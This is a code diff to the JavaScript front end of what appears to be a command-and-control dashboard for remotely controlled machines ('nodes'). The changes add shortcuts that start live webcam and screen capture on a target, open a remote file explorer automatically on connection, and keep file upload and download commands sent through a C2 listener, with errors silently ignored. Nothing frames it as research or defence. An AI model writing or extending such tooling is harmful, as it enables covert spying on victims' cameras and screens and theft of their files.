@@ -17,8 +17,6 @@ let leafletMarkers = [];
 
 // --- Live View State ---
 let streamInterval = null;
-let activeStream = { type: null, monitor: 0 };
-let activeQuality = 30; // Stream Slider Default Value
 const STREAM_POLL_RATE = 250; 
 
 // --- Terminal & Filesystem State ---
@@ -31,6 +29,7 @@ const FS_POLL_TIMEOUT = 20000;
 // ==========================================
 // UTILITIES
 // ==========================================
+// Bulletproof coordinate parser to prevent Leaflet NaN crashes
 function getSafeCoord(val, isLat) {
     const defaultCoord = isLat ? 28.5383 : -81.3792;
     if (val === undefined || val === null || val === '') return defaultCoord;
@@ -144,7 +143,7 @@ async function fetchData() {
     
     // Clear out session specific panels
     document.getElementById('fs-active-node').innerText = "None";
-    document.getElementById('fsTbody').innerHTML = `<tr><td colspan="4" class="text-center p-4 text-gray-600">Select target & click 'Open File Explorer'</td></tr>`;
+    document.getElementById('fsTbody').innerHTML = `<tr><td colspan="4" class="text-center p-4 text-gray-600">Select target node to load files...</td></tr>`;
     document.getElementById('terminal-connection-msg').innerText = "Waiting for node...";
     stopStream();
 
@@ -184,6 +183,7 @@ async function fetchData() {
         renderNodesList();
         renderMap();
         
+        // This triggers the Auto-File Explorer
         selectNode(activeNodeId); 
 
         statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
@@ -295,7 +295,11 @@ window.selectNode = function(nodeId) {
     appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
     document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
     
+    // Automatically update panel ID
     document.getElementById('fs-active-node').innerText = nodeId;
+    
+    // AUTOMATICALLY START FILE EXPLORER ON AUTHENTICATION
+    requestDirectoryListing('DRIVES');
 
     if (terminalPollInterval) {
         clearInterval(terminalPollInterval);
@@ -313,7 +317,9 @@ window.selectNode = function(nodeId) {
                     data.outputs.forEach(out => appendTerminalText(out, "output"));
                 }
             }
-        } catch(e) {}
+        } catch(e) {
+            // Silently fail polling
+        }
     }, 2000); 
 };
 
@@ -407,35 +413,62 @@ async function sendCommandToNode(deviceId, command) {
 }
 
 // ==========================================
-// LIVE VIEW STREAMING (MULTI-MONITOR + SLIDER)
+// LIVE VIEW STREAMING & MODULE SHORTCUTS
 // ==========================================
+window.triggerModuleShortcut = function(action) {
+    if(!activeNodeId) return showToast("No active node!", "error");
+
+    if (action === 'cam') {
+        document.getElementById('streamTarget').value = 'WEBCAM';
+        if(!streamInterval) {
+            startStream();
+        }
+    } else if (action === 'screen') {
+        document.getElementById('streamTarget').value = 'SCREEN_-1';
+        if(!streamInterval) {
+            startStream();
+        }
+    } else if (action === 'fs') {
+        const fsPanel = document.getElementById('panel-fs');
+        
+        // Un-minimize if it's currently collapsed
+        if (fsPanel.dataset.minimized === 'true') {
+            toggleMinimize(fsPanel.querySelector('.fa-window-restore').parentElement, 'panel-fs');
+        }
+        
+        // Highlight animation
+        fsPanel.classList.add('ring-2', 'ring-cyberBlue', 'scale-[1.01]', 'z-50');
+        setTimeout(() => {
+            fsPanel.classList.remove('ring-2', 'ring-cyberBlue', 'scale-[1.01]', 'z-50');
+        }, 500);
+    }
+};
+
 window.toggleStream = function() {
     if (!activeNodeId) {
         return showToast("No active node selected!", "error");
     }
+
     if (streamInterval) {
         stopStream();
     } else {
-        const type = activeStream.type || 'screen';
-        const monitor = activeStream.monitor !== undefined ? activeStream.monitor : -1;
-        startStream(type, monitor);
+        startStream();
     }
 };
 
 window.changeStreamQuality = function(val) {
-    activeQuality = parseInt(val);
-    document.getElementById('qualityLabel').innerText = `Q:${activeQuality}`;
-    if (activeStream.type && streamInterval) {
-        let streamTarget = activeStream.type === 'screen' ? `SCREEN_${activeStream.monitor}` : 'WEBCAM';
-        sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${activeQuality}`);
+    document.getElementById('qualityLabel').innerText = `Q:${val}`;
+    if (streamInterval) {
+        let streamTarget = document.getElementById('streamTarget').value;
+        sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${val}`);
     }
 };
 
-window.startStream = async function(type, monitorIndex = -1) {
+window.startStream = async function() {
     if (!activeNodeId) {
         return showToast("No active node selected!", "error");
     }
-    
+
     // Ensure panel is not minimized
     const panel = document.getElementById('panel-live');
     if (panel.dataset.minimized === 'true') {
@@ -446,53 +479,49 @@ window.startStream = async function(type, monitorIndex = -1) {
         stopStream(); 
     }
 
-    activeStream.type = type;
-    activeStream.monitor = monitorIndex;
+    const targetVal = document.getElementById('streamTarget').value;
+    const quality = document.getElementById('streamQuality').value;
 
     const title = document.getElementById('liveViewTitle');
-    const monitorControls = document.getElementById('monitorControls');
     const imageEl = document.getElementById('liveViewImage');
     const spinner = document.getElementById('liveViewSpinner');
     const toggleBtn = document.getElementById('streamToggleBtn');
     
+    // Show spinner
     spinner.style.display = 'flex';
     spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-2xl mb-2"></i><p class="text-gray-500 font-mono text-[10px]">Awaiting frames...</p>`;
     imageEl.src = "";
     imageEl.style.display = 'none';
 
-    // Update Toggle Button to Stop State
+    // Change Play button to Stop button (Red)
     toggleBtn.className = "w-4 h-4 rounded-full bg-red-500/20 text-red-500 hover:bg-red-500 hover:text-white flex items-center justify-center text-[8px]";
     toggleBtn.innerHTML = '<i class="fa-solid fa-stop"></i>';
+    toggleBtn.title = "Stop Stream";
 
-    let streamTarget = type === 'screen' ? `SCREEN_${monitorIndex}` : 'WEBCAM';
-
-    let sliderHtml = `
-        <div class="flex items-center gap-1 border-l border-gray-700 pl-2 ml-1">
-            <span class="text-[9px] text-gray-500" title="High FPS, Low Quality"><i class="fa-solid fa-gauge-high"></i></span>
-            <input type="range" min="10" max="90" step="10" value="${activeQuality}" onchange="changeStreamQuality(this.value)" class="w-16 h-1 bg-gray-700 rounded-lg appearance-none cursor-pointer">
-            <span class="text-[9px] text-gray-500" title="Low FPS, High Quality"><i class="fa-solid fa-image"></i></span>
-            <span id="qualityLabel" class="text-[9px] text-cyberBlue font-mono ml-1 w-6">Q:${activeQuality}</span>
-        </div>
-    `;
-
-    if (type === 'screen') {
+    // Update Title logic based on selection
+    if (targetVal.includes("SCREEN")) {
         title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}`;
-        let monButtons = `
-            <button onclick="startStream('screen', -1)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === -1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">ALL</button>
-            <button onclick="startStream('screen', 0)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === 0 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">M1</button>
-            <button onclick="startStream('screen', 1)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === 1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">M2</button>
-            <button onclick="startStream('screen', 2)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === 2 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">M3</button>
-        `;
-        monitorControls.innerHTML = monButtons + sliderHtml;
-        monitorControls.classList.remove('hidden');
     } else {
         title.innerHTML = `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
-        monitorControls.innerHTML = sliderHtml;
-        monitorControls.classList.remove('hidden');
     }
 
-    termLog(`Initiating stream for ${streamTarget} at Quality ${activeQuality}...`);
-    await sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${activeQuality}`);
+    termLog(`Initiating stream for ${targetVal} at Quality ${quality}...`);
+    await sendCommandToNode(activeNodeId, `START_STREAM:${targetVal}|${quality}`);
+    
+    // Bind dynamic source change
+    document.getElementById('streamTarget').onchange = () => {
+        if(streamInterval) {
+            termLog(`Switching stream source...`);
+            sendCommandToNode(activeNodeId, `START_STREAM:${document.getElementById('streamTarget').value}|${document.getElementById('streamQuality').value}`);
+            
+            if (document.getElementById('streamTarget').value.includes("SCREEN")) {
+                title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}`;
+            } else {
+                title.innerHTML = `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
+            }
+        }
+    };
+
     streamInterval = setInterval(fetchFrame, STREAM_POLL_RATE);
 };
 
@@ -501,7 +530,8 @@ async function fetchFrame() {
         return stopStream();
     }
     
-    const cacheKey = activeStream.type === 'screen' ? `screen_${activeStream.monitor}` : 'webcam';
+    const targetVal = document.getElementById('streamTarget').value;
+    const cacheKey = targetVal === 'WEBCAM' ? 'webcam' : targetVal.toLowerCase();
     
     try {
         const response = await fetch(`${C2_LISTENER_URL}/frames/${activeNodeId}/${cacheKey}`, {
@@ -516,6 +546,7 @@ async function fetchFrame() {
             imageEl.style.display = 'block';
         }
     } catch (e) {
+        // Ignore fetch errors during fast polling
     }
 }
 
@@ -529,15 +560,15 @@ window.stopStream = function() {
         termLog(`Stream stopped for ${activeNodeId}.`);
     }
 
-    // Reset UI to idle
+    // Change Stop button back to Play button (Green)
     const toggleBtn = document.getElementById('streamToggleBtn');
     if (toggleBtn) {
         toggleBtn.className = "w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]";
         toggleBtn.innerHTML = '<i class="fa-solid fa-play"></i>';
+        toggleBtn.title = "Play Stream";
     }
     
     document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream`;
-    document.getElementById('monitorControls').classList.add('hidden');
     document.getElementById('liveViewImage').style.display = 'none';
     
     const spinner = document.getElementById('liveViewSpinner');
@@ -550,22 +581,9 @@ window.stopStream = function() {
 // ==========================================
 // FILE EXPLORER
 // ==========================================
-window.openFileSystem = function() {
-    if(!activeNodeId) {
-        return showToast("Must authenticate to node first.", "error");
-    }
-    
-    const panel = document.getElementById('panel-fs');
-    if (panel.dataset.minimized === 'true') {
-        toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, 'panel-fs');
-    }
-    
-    document.getElementById('fs-active-node').innerText = activeNodeId;
-    requestDirectoryListing('DRIVES');
-    termLog("File Explorer initialized. Requesting drive listing...");
-};
-
 function requestDirectoryListing(path) {
+    if (!activeNodeId) return;
+
     if (fsPollInterval) {
         clearInterval(fsPollInterval);
     }
@@ -786,7 +804,9 @@ window.downloadFile = function(fullPath) {
                     showToast("Download complete!", "success");
                 }
             }
-        } catch(e) { }
+        } catch(e) { 
+            // Silent error handles
+        }
     }, 2000);
 };
 
@@ -807,6 +827,7 @@ document.getElementById('fileUploadInput').onchange = function(e) {
         
         sendCommandToNode(activeNodeId, `UPLOAD_FILE:${destPath}|${base64Data}`);
         showToast(`Uploading ${file.name}...`);
+        
         setTimeout(() => requestDirectoryListing(currentFsPath), 3500);
     };
     reader.readAsDataURL(file);
@@ -938,7 +959,7 @@ function initDragAndDrop() {
 
     document.querySelectorAll('.draggable-header').forEach(header => {
         header.addEventListener('dragstart', (e) => {
-            if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized')) { 
+            if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized') || e.target.tagName === 'SELECT' || e.target.tagName === 'INPUT') { 
                 e.preventDefault(); 
                 return; 
             }
